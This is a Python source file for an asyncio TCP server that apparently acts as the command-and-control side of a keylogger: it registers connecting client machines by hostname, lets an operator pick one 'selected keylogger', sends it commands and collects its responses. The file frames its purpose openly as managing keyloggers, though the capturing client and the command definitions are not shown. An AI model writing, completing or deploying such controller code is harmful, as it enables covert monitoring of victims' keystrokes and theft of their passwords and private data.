import asyncio
import logging

from utils import MetaSingleton
from commands import Command

logger = logging.getLogger(__name__)


class Server(metaclass=MetaSingleton):
    TIMEOUT: float = 2.5
    BUFFER: int = 1024
    DEFAULT_HOSTNAME = 'Unknown'

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.clients = {}
        self.__selected_keylogger = None

    @property
    def selected_keylogger(self):
        return self.__selected_keylogger

    @selected_keylogger.setter
    def selected_keylogger(self, addr: tuple):
        if addr not in self.clients:
            self.__selected_keylogger = None
        else:
            self.__selected_keylogger = addr

    async def disconnect_client(self, addr: tuple):
        if addr in self.clients:
            if addr == self.__selected_keylogger:
                self.__selected_keylogger = None
            _, writer = self.clients.pop(addr)
            writer.close()
            await writer.wait_closed()
            logger.info(f'Client {addr} disconnected and removed')
        else:
            logger.error(f'Client {addr} not found')

    async def read_response(self, addr: tuple, buffer: int = BUFFER, timeout: float = TIMEOUT):
        response = b''
        reader, _ = self.clients[addr]
        while True:
            try:
                answer = await asyncio.wait_for(reader.read(buffer), timeout)
                if not answer:
                    logger.debug(f'answer b"", client {addr} close connect')
                    break
                response += answer
            except TimeoutError:
                logger.debug(f'Execution timeout -> get {response}')
                break
        if response:
            return response
        await self.disconnect_client(addr)

    async def send_command(self, addr: tuple, command: Command):
        _, writer = self.clients[addr]
        try:
            if writer.is_closing():
                logger.info(f'Client {addr} connection is closing, cannot send command')
                await self.disconnect_client(addr)
                return
            writer.write(command.COMMAND.encode() + b'\n')
            await writer.drain()
        except (ConnectionResetError, BrokenPipeError) as e:
            logger.error(f'Connection close {addr}: {e}')
            await self.disconnect_client(addr)

    async def request(self, command: Command):
        if self.__selected_keylogger is None:
            return
        reader, _ = self.clients[self.__selected_keylogger]
        if reader._waiter is not None:
            return
        await self.send_command(self.__selected_keylogger, command)
        return await self.read_response(self.__selected_keylogger)

    async def monitor_client(self):
        clients_delete = []
        for addr in self.clients:
            reader, _ = self.clients[addr]
            if reader.at_eof():
                logger.info(f'Client {addr} closed connection (detected by monitor)')
                clients_delete.append(addr)
        for addr in clients_delete:
            await self.disconnect_client(addr)

    async def handler(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        addr = writer.get_extra_info('peername')
        logger.info(f'client {addr} connect')
        try:
            hostname = await asyncio.wait_for(reader.read(256), .5)
            hostname = hostname.decode().strip() if hostname else self.DEFAULT_HOSTNAME
        except asyncio.TimeoutError:
            logger.info(f'Client did not send a hostname, setting it to {self.DEFAULT_HOSTNAME}')
            hostname = self.DEFAULT_HOSTNAME
        addr = (hostname, *addr)
        if addr not in self.clients:
            self.clients[addr] = (reader, writer)

    async def start(self):
        server = await asyncio.start_server(self.handler, self.host, self.port)
        logger.info(f'Server start {self.host}:{self.port}')
        async with server:
            await server.serve_forever()
